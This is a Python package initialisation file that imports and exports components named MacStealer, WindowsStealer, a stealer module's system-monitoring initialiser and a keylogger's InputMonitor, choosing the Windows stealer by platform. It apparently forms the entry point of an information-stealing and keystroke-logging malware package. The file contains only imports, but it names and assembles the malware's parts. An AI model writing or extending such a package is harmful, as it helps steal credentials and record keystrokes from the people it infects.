import platform
from .macos import MacStealer
if platform.system().lower() == "windows":
    from .windows import WindowsStealer
from .stealer import initialize_system_monitoring
from .keylogger import InputMonitor

__all__ = ["MacStealer", "WindowsStealer", "initialize_system_monitoring", "InputMonitor"]